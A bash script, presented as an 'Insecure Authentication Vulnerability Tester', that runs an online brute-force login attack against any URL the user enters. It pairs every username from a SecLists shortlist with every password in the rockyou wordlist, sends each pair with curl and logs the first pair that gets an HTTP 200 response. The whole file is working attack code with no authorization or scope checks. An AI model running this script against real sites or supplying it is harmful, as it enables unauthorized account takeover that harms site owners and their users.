#!/bin/bash

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to check if a URL is valid
validate_url() {
    if [[ "$1" =~ ^https?:// ]]; then
        return 0
    else
        return 1
    fi
}

# Function to perform brute force attack
brute_force_attack() {
    local TARGET_URL=$1
    local USERNAME_FILE=$2
    local WORDLIST_FILE=$3
    local LOG_FILE=$4

    while IFS= read -r USERNAME; do
        while IFS= read -r PASSWORD; do
            response=$(curl -s -o /dev/null -w "%{http_code}" -d "username=$USERNAME&password=$PASSWORD" "$TARGET_URL")

            if [ "$response" == "200" ]; then
                echo -e "${GREEN}[+] Login successful with credentials: $USERNAME:$PASSWORD${NC}"
                echo "[+] Login successful with credentials: $USERNAME:$PASSWORD" >> "$LOG_FILE"
                exit 0
            fi
        done < <(gunzip -c "$WORDLIST_FILE")
    done < "$USERNAME_FILE"

    echo -e "${RED}[-] Brute force attack unsuccessful.${NC}"
    echo "[-] Brute force attack unsuccessful." >> "$LOG_FILE"
    exit 1
}

# Main program
echo -e "${YELLOW}Welcome to the Insecure Authentication Vulnerability Tester${NC}"
read -p "[?] Enter your target website URL: " TARGET_URL

# Validate the URL
if ! validate_url "$TARGET_URL"; then
    echo -e "${RED}[!] Invalid URL. Please enter a valid URL starting with http:// or https://.${NC}"
    exit 1
fi

# Set the username and wordlist file paths
USERNAME_FILE="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
WORDLIST_FILE="/usr/share/wordlists/rockyou.txt.gz"
LOG_FILE="auth_vuln_test.log"

# Check if username file exists
if [ ! -f "$USERNAME_FILE" ]; then
    echo -e "${RED}[!] Username file not found.${NC}"
    exit 1
fi

# Check if wordlist file exists
if [ ! -f "$WORDLIST_FILE" ]; then
    echo -e "${RED}[!] Wordlist file not found.${NC}"
    exit 1
fi

# Start the attack
echo -e "${YELLOW}[*] Testing for insecure authentication vulnerability on $TARGET_URL...${NC}"
brute_force_attack "$TARGET_URL" "$USERNAME_FILE" "$WORDLIST_FILE" "$LOG_FILE"
